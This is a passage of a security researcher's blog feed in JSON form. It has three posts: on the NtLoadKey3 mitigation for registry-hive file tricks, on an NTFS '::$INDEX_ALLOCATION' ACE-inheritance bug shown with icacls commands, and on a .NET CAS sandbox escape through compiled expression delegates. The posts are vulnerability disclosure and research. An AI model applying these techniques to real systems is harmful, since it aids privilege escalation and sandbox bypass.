href=\"https://j00ru.vexillium.org/syscalls/nt/64/\">system call table</a> this was introduced in Windows 10 2004, however it's at least in Windows 10 1909 as well. As the name suggests (if you're me at least) this loads a Registry Key Hive to an attachment point. This functionality has been extended over time, originally there was only <i>NtLoadKey</i>, then <i>NtLoadKey2</i> was introduced in XP I believe to add some flags. Then <i>NtLoadKeyEx </i>was introduced to add things like explicit Trusted Hive support to mitigate cross hive symbolic link attacks (which is all j00ru's and <a href=\"https://gynvael.coldwind.pl/\">Gynvael</a> fault). And now finally <i>NtLoadKey3.</i>&nbsp;I've no idea why it went to <i>2</i> then to <i>Ex</i> then back to <i>3</i> maybe it's some new Microsoft counting system. The <i>NtLoadKeyEx</i> is partially exposed through the Win32 APIs <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regloadkeyw\">RegLoadKey</a> and <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regloadappkeyw\">RegLoadAppKey</a> APIs, although they're only expose a subset of the system call's functionality.<br /><br />Okay, so what bug class is Nt<i>LoadKey3 </i>trying to mitigate? One of the problematic behaviors of loading a full Registry Hive (rather that a Per-User Application Hive) is you need to have <i>SeRestorePrivilege*</i>&nbsp;on the caller's Effective Token. <i>SeRestorePrivilege&nbsp;</i>is only granted to Administrators, so in order to call the API successfully you can't be impersonating a low-privileged user. However, the API can also create files when loading the hive file. This includes the hive file itself as well as the recovery log files.<br /><br /><i>* Don't pay attention to the documentation for RegLoadKey which claims you also need SeBackupPrivilege. Maybe it was required at some point, but it isn't any more.</i><br /><br />When loading a system hive such as HKLM\\SOFTWARE this isn't an issue as these hives are stored in an Administrator only location (<i>c:\\windows\\system32\\config</i> if you're curious) but sometimes the hives are loaded from user-accessible locations such as from the user's profile or for Desktop Bridge support. In a user accessible location you can use symbolic link tricks to force the logs file to be written to arbitrary locations, and to make matters worse the Security Descriptor of the primary hive file is copied to the log file so it'll be accessible afterwards. An example of just this bug, in this case in Desktop Bridge, is issue <a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1492\">1492</a>&nbsp;(and <a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1554\">1554</a> as they didn't fix it properly (\u256f\u00b0\u25a1\u00b0\uff09\u256f\ufe35 \u253b\u2501\u253b).<br /><br /><i>RegLoadKey3 </i>fixes this by introducing an additional parameter to specify an Access Token which will be impersonated when creating any files. This way the check for <i>SeRestorePrivilege </i>can use the caller's Access Token, but any \"dangerous\" operation will use the user's Token. Of course they could have probably implemented this by adding a new flag which will check the caller's Primary Token for the privilege like they do for <i>SeImpersonatePrivilege </i>and <i>SeAssignPrimaryTokenPrivilege </i>but what do I know...<br /><br />Used appropriately this should completely mitigate the poor design of the system call. For example the User Profile service now uses <i>NtLoadKey3</i> when loading the hives from the user's profile. How do you call it yourself? I couldn't find any documentation obviously, and even in the usual locations such as OLE32's private symbols there doesn't seem to be any structure data, so I made best guess with the following:<br /><br />Notice that the <i>TrustKey </i>and <i>Event</i> handles from <i>NtLoadKeyEx</i> have also been folded up into a list of handle values. Perhaps someone wasn't sure if they ever needed to extend the system call whether to go for <i>NtLoadKey4 </i>or <i>NtLoadKeyExEx </i>so they avoided the decision by making the system call more flexible. Also the final parameter, which is also present in <i>NtLoadKeyEx</i> is seemingly unused, or I'm just incapable of tracking down when it gets referenced. Process Hacker's <a href=\"https://github.com/processhacker/processhacker/blob/master/phnt/include/ntzwapi.h\">header files</a> claim it's for an <i>IO_STATUS_BLOCK</i> pointer, but I've seen no evidence that's the case.<br /><br />It'd be really awesome if in this new, sharing and caring Microsoft that they, well shared and cared more often, especially for features important to securing third party applications. TBH I think they're more focused on bringing <a href=\"https://lists.freedesktop.org/archives/dri-devel/2020-May/266691.html\">Wayland to WSL2</a> or shoving a <a href=\"https://github.com/microsoft/ProjectReunion\">new API set</a> down developers' throats than documenting things like this.", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/4483564999833455266"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/4483564999833455266"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2020/05/silent-exploit-mitigations-for-1.html", "title": "Silent Exploit Mitigations for the 1%"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-3153659162403604870", "guidislink": true, "link": "https://www.tiraniddo.dev/2020/05/writing-windows-file-system-drivers-is.html", "published": "2020-05-20T14:29:00.000-07:00", "published_parsed": [2020, 5, 20, 21, 29, 0, 2, 141, 0], "updated": "2020-05-20T14:29:36.833-07:00", "updated_parsed": [2020, 5, 20, 21, 29, 36, 2, 141, 0], "tags": [{"term": "NTFS", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Strange Behaviour", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Windows", "scheme": "http://www.blogger.com/atom/ns#", "label": null}], "title": "Writing Windows File System Drivers is Hard.", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Writing Windows File System Drivers is Hard."}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "A <a href=\"https://twitter.com/jonasLyk/status/1261746246026506252\">tweet</a> by <a href=\"https://twitter.com/jonasLyk\">@jonasLyk</a> reminded me of a bug I found in NTFS a few months back, which I've verified still exists in Windows 10 2004. As far as I can tell it's not directly usable to circumvent security but it feels like a bug which could be used in a chain. NTFS is a good demonstration of how complex writing a FS driver is on Windows, so it's hardly surprising that so many weird edges cases pop up over time.<br /><br />The issue in this case was related to the default Security Descriptor (SD) assignment when creating a new Directory. If you understand anything about Windows SDs you'll know it's possible to specify the inheritance rules through either the&nbsp;<i>CONTAINER_INHERIT_ACE&nbsp;</i>and/or&nbsp;<i>OBJECT_INHERIT_ACE</i>&nbsp;ACE flags. These flags represent whether the ACE should be inherited from a parent directory if the new entry is either a Directory or a File. Let's look at the code which NTFS uses to assign security to a new file and see if you can spot the bug?<br /><br />The code uses&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-seassignsecurityex\">SeAssignSecurityEx</a> to create the new SD based on the Parent SD and any explicit SD from the caller. For inheritance to work you can't specify an explicit SD, so we can ignore that. Whether&nbsp;<i>SeAssignSecurityEx</i> applies the inheritance rules for a Directory or a File depends on the value of the <i>IsDirectoryObject</i> parameter. This is set to TRUE if the <i>FILE_DIRECTORY_FILE</i> options flag was passed to <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntcreatefile\">NtCreateFile</a>. That seems fine, you can't create a Directory if you don't specify the <i>FILE_DIRECTORY_FILE</i> flag, if you don't specify a flag then a File will be created by default.<br /><br />But wait, that's not true at all. If you specify a name of the form <i>ABC::$INDEX_ALLOCATION</i> then NTFS will create a Directory no matter what flags you specify. Therefore the bug is, if you create a directory using the <i>$INDEX_ALLOCATION</i> trick then the new SD will inherit as if it was a File rather than a Directory. We can verifying this behavior on the command prompt.<br /><br /><span>C:\\&gt; mkdir ABC</span><br /><span>C:\\&gt; icacls ABC /grant \"INTERACTIVE\":(CI)(IO)(F)</span><br /><span>C:\\&gt; icacls ABC /grant \"NETWORK\":(OI)(IO)(F)</span><br /><br />First we create a directory <i>ABC </i>and grant two ACEs, one for the <i>INTERACTIVE </i>group will inherit on a Directory, the other for&nbsp;<i>NETWORK </i>will inherit on a File.<br /><br /><span>C:\\&gt; echo \"Hello\" &gt; ABC\\XYZ::$INDEX_ALLOCATION</span><br /><span>Incorrect function.</span><br /><br />We then create the sub-directory <i>XYZ</i> using the <i>$INDEX_ALLOCATION</i> trick. We can be sure it worked as <i>CMD </i>prints \"Incorrect function\" when it tries to write \"Hello\" to the directory object.<br /><br /><span>C:\\&gt; icacls ABC\\XYZ</span><br /><span>ABC\\XYZ NT AUTHORITY\\NETWORK:(I)(F)</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; NT AUTHORITY\\SYSTEM:(I)(F)</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; BUILTIN\\Administrators:(I)(F)</span><br /><br />Dumping the SD for the <i>XYZ </i>sub-directory we see the ACEs were inherited based on it being a File, rather than a Directory as we can see an ACE for <i>NETWORK</i>&nbsp;rather than for <i>INTERACTIVE</i>. Finally we list <i>ABC </i>to verify it really is a directory.<br /><br /><span>C:\\&gt; dir ABC</span><br /><span>&nbsp;Volume in drive C has no label.</span><br /><span>&nbsp;Volume Serial Number is 9A7B-865C</span><br /><span><br /></span><span>&nbsp;Directory of C:\\ABC</span><br /><span><br /></span><span>2020-05-20&nbsp; 19:09&nbsp; &nbsp; &lt;DIR&gt;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .</span><br /><span>2020-05-20&nbsp; 19:09&nbsp; &nbsp; &lt;DIR&gt;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ..</span><br /><span>2020-05-20&nbsp; 19:05&nbsp; &nbsp; &lt;DIR&gt;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; XYZ</span><br /><br /><br />Is this useful? Honestly probably not. The only scenario I could imagine it would be is if you can specify a path to a system service which creates a file in a location where inherited File access would grant access and inherited Directory access would not. This would allow you to create a Directory you can control, but it seems a bit of a stretch to be honest. If anyone can think of a good use for this let me or Microsoft know :-)<br /><br />Still, it's interesting that this is another case where <i>$INDEX_ALLOCATION</i> isn't correctly verified where determining whether an object is a Directory or a File. Another good example was <a href=\"https://sec-consult.com/en/blog/2018/06/pentesters-windows-ntfs-tricks-collection/\">CVE-2018-1036</a>, where you could create a new Directory with only <i>FILE_ADD_FILE</i> permission. Quite why this design decision was made to automatically create a Directory when using the stream type is unclear. I guess we might never know.<br /><br /><br />"}], "summary": "A <a href=\"https://twitter.com/jonasLyk/status/1261746246026506252\">tweet</a> by <a href=\"https://twitter.com/jonasLyk\">@jonasLyk</a> reminded me of a bug I found in NTFS a few months back, which I've verified still exists in Windows 10 2004. As far as I can tell it's not directly usable to circumvent security but it feels like a bug which could be used in a chain. NTFS is a good demonstration of how complex writing a FS driver is on Windows, so it's hardly surprising that so many weird edges cases pop up over time.<br /><br />The issue in this case was related to the default Security Descriptor (SD) assignment when creating a new Directory. If you understand anything about Windows SDs you'll know it's possible to specify the inheritance rules through either the&nbsp;<i>CONTAINER_INHERIT_ACE&nbsp;</i>and/or&nbsp;<i>OBJECT_INHERIT_ACE</i>&nbsp;ACE flags. These flags represent whether the ACE should be inherited from a parent directory if the new entry is either a Directory or a File. Let's look at the code which NTFS uses to assign security to a new file and see if you can spot the bug?<br /><br />The code uses&nbsp;<a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-seassignsecurityex\">SeAssignSecurityEx</a> to create the new SD based on the Parent SD and any explicit SD from the caller. For inheritance to work you can't specify an explicit SD, so we can ignore that. Whether&nbsp;<i>SeAssignSecurityEx</i> applies the inheritance rules for a Directory or a File depends on the value of the <i>IsDirectoryObject</i> parameter. This is set to TRUE if the <i>FILE_DIRECTORY_FILE</i> options flag was passed to <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntcreatefile\">NtCreateFile</a>. That seems fine, you can't create a Directory if you don't specify the <i>FILE_DIRECTORY_FILE</i> flag, if you don't specify a flag then a File will be created by default.<br /><br />But wait, that's not true at all. If you specify a name of the form <i>ABC::$INDEX_ALLOCATION</i> then NTFS will create a Directory no matter what flags you specify. Therefore the bug is, if you create a directory using the <i>$INDEX_ALLOCATION</i> trick then the new SD will inherit as if it was a File rather than a Directory. We can verifying this behavior on the command prompt.<br /><br /><span>C:\\&gt; mkdir ABC</span><br /><span>C:\\&gt; icacls ABC /grant \"INTERACTIVE\":(CI)(IO)(F)</span><br /><span>C:\\&gt; icacls ABC /grant \"NETWORK\":(OI)(IO)(F)</span><br /><br />First we create a directory <i>ABC </i>and grant two ACEs, one for the <i>INTERACTIVE </i>group will inherit on a Directory, the other for&nbsp;<i>NETWORK </i>will inherit on a File.<br /><br /><span>C:\\&gt; echo \"Hello\" &gt; ABC\\XYZ::$INDEX_ALLOCATION</span><br /><span>Incorrect function.</span><br /><br />We then create the sub-directory <i>XYZ</i> using the <i>$INDEX_ALLOCATION</i> trick. We can be sure it worked as <i>CMD </i>prints \"Incorrect function\" when it tries to write \"Hello\" to the directory object.<br /><br /><span>C:\\&gt; icacls ABC\\XYZ</span><br /><span>ABC\\XYZ NT AUTHORITY\\NETWORK:(I)(F)</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; NT AUTHORITY\\SYSTEM:(I)(F)</span><br /><span>&nbsp; &nbsp; &nbsp; &nbsp; BUILTIN\\Administrators:(I)(F)</span><br /><br />Dumping the SD for the <i>XYZ </i>sub-directory we see the ACEs were inherited based on it being a File, rather than a Directory as we can see an ACE for <i>NETWORK</i>&nbsp;rather than for <i>INTERACTIVE</i>. Finally we list <i>ABC </i>to verify it really is a directory.<br /><br /><span>C:\\&gt; dir ABC</span><br /><span>&nbsp;Volume in drive C has no label.</span><br /><span>&nbsp;Volume Serial Number is 9A7B-865C</span><br /><span><br /></span><span>&nbsp;Directory of C:\\ABC</span><br /><span><br /></span><span>2020-05-20&nbsp; 19:09&nbsp; &nbsp; &lt;DIR&gt;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .</span><br /><span>2020-05-20&nbsp; 19:09&nbsp; &nbsp; &lt;DIR&gt;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ..</span><br /><span>2020-05-20&nbsp; 19:05&nbsp; &nbsp; &lt;DIR&gt;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; XYZ</span><br /><br /><br />Is this useful? Honestly probably not. The only scenario I could imagine it would be is if you can specify a path to a system service which creates a file in a location where inherited File access would grant access and inherited Directory access would not. This would allow you to create a Directory you can control, but it seems a bit of a stretch to be honest. If anyone can think of a good use for this let me or Microsoft know :-)<br /><br />Still, it's interesting that this is another case where <i>$INDEX_ALLOCATION</i> isn't correctly verified where determining whether an object is a Directory or a File. Another good example was <a href=\"https://sec-consult.com/en/blog/2018/06/pentesters-windows-ntfs-tricks-collection/\">CVE-2018-1036</a>, where you could create a new Directory with only <i>FILE_ADD_FILE</i> permission. Quite why this design decision was made to automatically create a Directory when using the stream type is unclear. I guess we might never know.<br /><br /><br />", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/3153659162403604870"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/3153659162403604870"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2020/05/writing-windows-file-system-drivers-is.html", "title": "Writing Windows File System Drivers is Hard."}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-1206188433429723773", "guidislink": true, "link": "https://www.tiraniddo.dev/2020/05/old-net-vulnerability-5-security.html", "published": "2020-05-07T16:12:00.000-07:00", "published_parsed": [2020, 5, 7, 23, 12, 0, 3, 128, 0], "updated": "2020-05-07T16:16:00.056-07:00", "updated_parsed": [2020, 5, 7, 23, 16, 0, 3, 128, 0], "tags": [{"term": ".NET", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Old Vulns", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Windows", "scheme": "http://www.blogger.com/atom/ns#", "label": null}], "title": "Old .NET Vulnerability #5: Security Transparent Compiled Expressions (CVE-2013-0073)", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Old .NET Vulnerability #5: Security Transparent Compiled Expressions (CVE-2013-0073)"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "It's been a long time since I wrote a blog post about my old .NET vulnerabilities. I was playing around with some .NET code and found an issue when serializing delegates inside a CAS sandbox, I got a <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.serializationexception?view=netcore-3.1\">SerializationException</a> thrown with the following text:<br /><br /><span>Cannot serialize delegates over unmanaged function pointers,&nbsp;</span><br /><span>dynamic methods or methods outside the delegate creator's assembly.</span><br /><span>&nbsp; &nbsp;</span><br />I couldn't remember if this has always been there or if it was new. I reached out on Twitter to my trusted friend on these matters, <a href=\"https://twitter.com/blowdart\">@blowdart</a>, who quickly fobbed me off to <a href=\"https://twitter.com/LeviBroderick\">Levi</a>. But the take away is at some point the behavior of Delegate serialization was changed as part of a more general change to add Secure Delegates.<br /><br />It was then I realized, that it's almost certainly (mostly) my fault that the .NET Framework has this feature and I dug out one of the bugs which caused it to be the way it is. Let's have a quick overview of what the Secure Delegate is trying to prevent and then look at the original bug.<br /><br />.NET <a href=\"https://docs.microsoft.com/en-us/dotnet/framework/misc/code-access-security\">Code Access Security (CAS)</a>&nbsp;as I've mentioned before when discussing my <a href=\"https://www.tiraniddo.dev/2014/11/old-net-vulnerability-1-pac-script-rce.html\">.NET PAC vulnerability</a>&nbsp;allows a .NET \"sandbox\" to restrict untrusted code to a specific set of permissions. When a permission <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.security.permissionset.demand?view=dotnet-plat-ext-3.1#System_Security_PermissionSet_Demand\">demand</a> is requested the CLR will walk the calling stack and check the Assembly Grant Set for every Stack Frame. If there is any code on the Stack which doesn't have the required Permission Grants then the Stack Walk stops and a <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.security.securityexception?view=netcore-3.1\">SecurityException</a> is generated which blocks the function from continuing. I've shown this in the following diagram, some untrusted code tries to open a file but is blocked by a Demand for <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.security.permissions.fileiopermission?view=dotnet-plat-ext-3.1\">FileIOPermission</a> as the Stack Walk sees the untrusted Code and stops.<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-bYDEWLKmjmM/XrSNAgsPPbI/AAAAAAAAEg4/PtyQRm6QYIYGkPtZMLdH4C1yHEy-81l8QCLcBGAsYHQ/s1600/Normal%2BStack%2BWalk%2B%25281%2529.png\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"View of a stack walk in .NET blocking a FileIOPermission Demand on an Untrusted Caller stack frame.\" border=\"0\" height=\"341\" src=\"https://1.bp.blogspot.com/-bYDEWLKmjmM/XrSNAgsPPbI/AAAAAAAAEg4/PtyQRm6QYIYGkPtZMLdH4C1yHEy-81l8QCLcBGAsYHQ/s400/Normal%2BStack%2BWalk%2B%25281%2529.png\" title=\"\" width=\"400\" /></a></div><div class=\"separator\" style=\"clear: both; text-align: center;\"></div><br />What has this to do with delegates? A problem occurs if an attacker can find some code which will invoke a delegate under asserted permissions. For example, in the previous diagram there was an Assert at the bottom of the stack, but the Stack Walk fails early when it hits the Untrusted Caller Frame.<br /><br />However, as long as we have a delegate call, and the function the delegate calls is Trusted then we can put it into the chain and successfully get the privileged operation to happen.<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-I-IkjdVswcA/XrSNlR60icI/AAAAAAAAEhA/a5Rv_5deUrwCyjduORdS2eAxyFQLXWwigCLcBGAsYHQ/s1600/Hacked%2BStack%2BWalk.png\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"View of a stack walk in .NET allowed due to replacing untrusted call frame with a delegate.\" border=\"0\" height=\"342\" src=\"https://1.bp.blogspot.com/-I-IkjdVswcA/XrSNlR60icI/AAAAAAAAEhA/a5Rv_5deUrwCyjduORdS2eAxyFQLXWwigCLcBGAsYHQ/s400/Hacked%2BStack%2BWalk.png\" title=\"\" width=\"400\" /></a></div><br />The problem with this technique is finding a trusted function we can wrap in a delegate which you can attach to something such a Windows Forms event handler, which might have the prototype:<br /><span>void Callback(object obj, EventArgs e)</span><br /><span><br /></span>and would call the <i>File.OpenRead</i> function which has the prototype:<br /><br /><span>FileStream OpenRead(string path)</span>.<br /><br />That's a pretty tricky thing to find. If you know C# you'll know about Lambda functions, could we use something like?<br /><br /><span>EventHandler&nbsp;f = (o,e) =&gt; File.OpenRead(@\"C:\\SomePath\")</span><br /><br />Unfortunately not, the C# compiler takes the lambda, generates an automatic class with that function prototype in your own assembly. Therefore the call to adapt the arguments will go through an Untrusted function and it'll fail the Stack Walk. It looks something like the following in CIL:<br /><br />Turns out there's another way. See if you can spot the difference here.<br /><br /><span>Expression lambda = (o,e) =&gt; File.OpenRead(@\"C:\\SomePath\")</span><br /><span>EventHandle f = lambda.Compile()</span><br /><br />We're still using a lambda, surely nothing has changed? We'll let's look at the CIL.<br /><br />That's just crazy. What's happened? The key is the use of <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.linq.expressions.expression-1?view=netcore-3.1\">Expression</a>. When the C# compiler sees that type it decides rather than create a delegate in your assembly it'll creation something called an expression tree. That tree is then compiled into the final delegate. The important thing for the vulnerability I reported is this delegate was trusted as it was built using the <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.reflection.emit.assemblybuilder?view=netcore-3.1\">AssemblyBuilder</a> functionality which takes the Permission Grant Set from the calling Assembly. As the calling Assembly is the Framework code it got full trust. It wasn't trusted to Assert permissions (a Security Transparent function), but it also wouldn't block the Stack Walk either. This allows us to implement any arbitrary Delegate adapter to convert one Delegate call-site into calling any other API as long as you can do that under an Asserted permission set.<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-CbIqeQ8-G5Q/XrSTL0a4QkI/AAAAAAAAEhM/j7MO7ze11pggAXgKf1bx_iaiJId6AIihwCLcBGAsYHQ/s1600/Hacked%2BStack%2BWalk%2B2.png\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"View of a stack walk in .NET allowed due to replacing untrusted call frame with a expression generated delegate.\" border=\"0\" height=\"341\" src=\"https://1.bp.blogspot.com/-CbIqeQ8-G5Q/XrSTL0a4QkI/AAAAAAAAEhM/j7MO7ze11pggAXgKf1bx_iaiJId6AIihwCLcBGAsYHQ/s400/Hacked%2BStack%2BWalk%2B2.png\" title=\"\" width=\"400\" /></a></div><br />I was able to find a number of places in WinForms which invoked Event Handlers while asserting permissions that I could exploit. The initial fix was to fix those call-sites, but the real fix came later, the aforementioned Secure Delegates.<br /><br />Silverlight always had Secure delegates, it would capture the current CAS Permission set on the stack when creating them and add a trampoline if needed to the delegate to insert an Untrusted Stack Frame into the call. Seems this was later added to .NET. The reason that Serializing is blocked is because when the Delegate gets serialized this trampoline gets lost and so there's a risk of it being used to exploit something to escape the sandbox. Of course CAS is dead anyway.<br /><br />The end result looks like the following:<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-rVOQvoYfkbc/XrSU58H3-dI/AAAAAAAAEhY/zbwamzg_HT0orZtFCZCwy44Ytcg_FQgNgCLcBGAsYHQ/s1600/Blocked%2BStack%2BWalk%2BExpression.png\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"View of a stack walk in .NET blocking a FileIOPermission Demand on an Untrusted Trampoline Stack Frame.\" border=\"0\" height=\"341\" src=\"https://1.bp.blogspot.com/-rVOQvoYfkbc/XrSU58H3-dI/AAAAAAAAEhY/zbwamzg_HT0orZtFCZCwy44Ytcg_FQgNgCLcBGAsYHQ/s400/Blocked%2BStack%2BWalk%2BExpression.png\" title=\"\" width=\"400\" /></a></div><br />Anyway, these are the kinds of design decisions that were never full scoped from a security perspective. They're not unique to .NET, or Java, or anything else which runs arbitrary code in a \"sandboxed\" context including things JavaScript engines such as V8 or JSCore.<br /><br /><br />"}], "summary": "It's been a long time since I wrote a blog post about my old .NET vulnerabilities. I was playing around with some .NET code and found an issue when serializing delegates inside a CAS sandbox, I got a <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.runtime.serialization.serializationexception?view=netcore-3.1\">SerializationException</a> thrown with the following text:<br /><br /><span>Cannot serialize delegates over unmanaged function pointers,&nbsp;</span><br /><span>dynamic methods or methods outside the delegate creator's assembly.</span><br /><span>&nbsp; &nbsp;</span><br />I couldn't remember if this has always been there or if it was new. I reached out on Twitter to my trusted friend on these matters, <a href=\"https://twitter.com/blowdart\">@blowdart</a>, who quickly fobbed me off to <a href=\"https://twitter.com/LeviBroderick\">Levi</a>. But the take away is at some point the behavior of Delegate serialization was changed as part of a more general change to add Secure Delegates.<br /><br />It was then I realized, that it's almost certainly (mostly) my fault that the .NET Framework has this feature and I dug out one of the bugs which caused it to be the way it is. Let's have a quick overview of what the Secure Delegate is trying to prevent and then look at the original bug.<br /><br />.NET <a href=\"https://docs.microsoft.com/en-us/dotnet/framework/misc/code-access-security\">Code Access Security (CAS)</a>&nbsp;as I've mentioned before when discussing my <a href=\"https://www.tiraniddo.dev/2014/11/old-net-vulnerability-1-pac-script-rce.html\">.NET PAC vulnerability</a>&nbsp;allows a .NET \"sandbox\" to restrict untrusted code to a specific set of permissions. When a permission <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.security.permissionset.demand?view=dotnet-plat-ext-3.1#System_Security_PermissionSet_Demand\">demand</a> is requested the CLR will walk the calling stack and check the Assembly Grant Set for every Stack Frame. If there is any code on the Stack which doesn't have the required Permission Grants then the Stack Walk stops and a <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.security.securityexception?view=netcore-3.1\">SecurityException</a> is generated which blocks the function from continuing. I've shown this in the following diagram, some untrusted code tries to open a file but is blocked by a Demand for <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.security.permissions.fileiopermission?view=dotnet-plat-ext-3.1\">FileIOPermission</a> as the Stack Walk sees the untrusted Code and stops.<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-bYDEWLKmjmM/XrSNAgsPPbI/AAAAAAAAEg4/PtyQRm6QYIYGkPtZMLdH4C1yHEy-81l8QCLcBGAsYHQ/s1600/Normal%2BStack%2BWalk%2B%25281%2529.png\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"View of a stack walk in .NET blocking a FileIOPermission Demand on an Untrusted Caller stack frame.\" border=\"0\" height=\"341\" src=\"https://1.bp.blogspot.com/-bYDEWLKmjmM/XrSNAgsPPbI/AAAAAAAAEg4/PtyQRm6QYIYGkPtZMLdH4C1yHEy-81l8QCLcBGAsYHQ/s400/Normal%2BStack%2BWalk%2B%25281%2529.png\" title=\"\" width=\"400\" /></a></div><div class=\"separator\" style=\"clear: both; text-align: center;\"></div><br />What has this to do with delegates? A problem occurs if an attacker can find some code which will invoke a delegate under asserted permissions. For example, in the previous diagram there was an Assert at the bottom of the stack, but the Stack Walk fails early when it hits the Untrusted Caller Frame.<br /><br />However, as long as we have a delegate call, and the function the delegate calls is Trusted then we can put it into the chain and successfully get the privileged operation to happen.<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-I-IkjdVswcA/XrSNlR60icI/AAAAAAAAEhA/a5Rv_5deUrwCyjduORdS2eAxyFQLXWwigCLcBGAsYHQ/s1600/Hacked%2BStack%2BWalk.png\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"View of a stack walk in .NET allowed due to replacing untrusted call frame with a delegate.\" border=\"0\" height=\"342\" src=\"https://1.bp.blogspot.com/-I-IkjdVswcA/XrSNlR60icI/AAAAAAAAEhA/a5Rv_5deUrwCyjduORdS2eAxyFQLXWwigCLcBGAsYHQ/s400/Hacked%2BStack%2BWalk.png\" title=\"\" width=\"400\" /></a></div><br />The problem with this technique is finding a trusted function we can wrap in a delegate which you can attach to something such a Windows Forms event handler, which might have the prototype:<br /><span>void Callback(object obj, EventArgs e)</span><br /><span><br /></span>and would call the <i>File.OpenRead</i> function which has the prototype:<br /><br /><span>FileStream OpenRead(string path)</span>.<br /><br />That's a pretty tricky thing to find. If you know C# you'll know about Lambda functions, could we use something like?<br /><br /><span>EventHandler&nbsp;f = (o,e) =&gt; File.OpenRead(@\"C:\\SomePath\")</span><br /><br />Unfortunately not, the C# compiler takes the lambda, generates an automatic class with that function prototype in your own assembly. Therefore the call to adapt the arguments will go through an Untrusted function and it'll fail the Stack Walk. It looks something like the following in CIL:<br /><br />Turns out there's another way. See if you can spot the difference here.<br /><br /><span>Expression lambda = (o,e) =&gt; File.OpenRead(@\"C:\\SomePath\")</span><br /><span>EventHandle f = lambda.Compile()</span><br /><br />We're still using a lambda, surely nothing has changed? We'll let's look at the CIL.<br /><br />That's just crazy. What's happened? The key is the use of <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.linq.expressions.expression-1?view=netcore-3.1\">Expression</a>. When the C# compiler sees that type it decides rather than create a delegate in your assembly it'll creation something called an expression tree. That tree is then compiled into the final delegate. The important thing for the vulnerability I reported is this delegate was trusted as it was built using the <a href=\"https://docs.microsoft.com/en-us/dotnet/api/system.reflection.emit.assemblybuilder?view=netcore-3.1\">AssemblyBuilder</a> functionality which takes the Permission Grant Set from the calling Assembly. As the calling Assembly is the Framework code it got full trust. It wasn't trusted to Assert permissions 